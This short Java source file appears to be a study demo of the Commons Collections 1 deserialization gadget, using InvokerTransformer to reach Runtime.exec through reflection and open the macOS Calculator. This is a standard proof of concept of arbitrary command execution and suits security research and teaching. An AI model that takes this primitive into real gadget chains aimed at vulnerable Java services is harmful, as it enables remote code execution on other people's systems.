package CommonsCollections1;

import org.apache.commons.collections.functors.InvokerTransformer;

public class InvokerTransformerDemo {
    public static void main(String[] args) {
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"});
        invokerTransformer.transform(Runtime.getRuntime());
    }
}
